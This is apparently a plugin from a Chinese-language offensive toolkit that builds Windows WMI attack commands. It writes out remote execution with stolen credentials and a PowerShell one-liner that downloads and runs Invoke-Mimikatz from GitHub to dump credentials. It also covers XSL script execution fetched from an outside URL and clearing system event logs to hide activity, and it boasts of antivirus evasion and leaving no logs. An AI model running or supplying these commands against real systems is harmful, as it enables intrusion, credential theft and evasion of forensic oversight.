# encoding: utf8
import os


class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Wmic Attack',
            'Author': 'whois',
            'Update': '2018/9/16',
        }

        self.desc_a = """
WMI 的全称是 Windows Management Instrumentation，适用于全版本windows

Windows系统默认不会在日志中记录这些操作，无日志攻击，同时攻击脚本无需写入到磁盘，内存执行，具有极高的隐蔽性

impackets wmiexec.py 跨平台,被360拦截，默认wmic不创建进程不拦截

>>  wmiexec.py administrator:123456@10.10.10.104
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\\>whoami
administrator

"""

        self.desc_mimikatz = """
使用wmic远程执行mimikatz命令，并将结果写到公开的目录中，读取之

测试360拦截

执行(Win32_Process)->Create()
方法执行成功。

dir \\10.10.10.104\\c$
type \\10.10.10.104\\c$\\mimi.txt
del \\10.10.10.104\\c$\\mimi.txt 
"""

        self.desc_reverse = """
使用wmic能够从本地或从URL调用XSL（可扩展样式表语言）脚本
本地执行 => wmic process list /FORMAT:evil.xsl
远程执行 => wmic os get /FORMAT:"https://example.com/evil" (服务器上文件为evil.xsl)
"""

    def wmi_exec(self, ip, user, password):
        return """wmic /node:{0} /user:{1} /password:{2} process get Name,ProcessId\nwmiexec.py {1}:{2}@{0}""".format(
            ip, user, password)

    def mimikatz(self, ip, user, password):
        return "wmic /node:{0} /user:{1} /password:{2} process call create \"Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/j3ers3/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\mimi.txt\"".format(
            ip, user, password)

    def reverse(self, url):
        return "wmic os get /FORMAT:{url}".format(url)

    def command(self):
        return """
获取已安装的应用程序列表    
wmic product get name

清理系统日志              
wmic nteventlog where filename='[logfilename]' cleareventlog
wmic nteventlog where filename='system' cleareventlog

"""
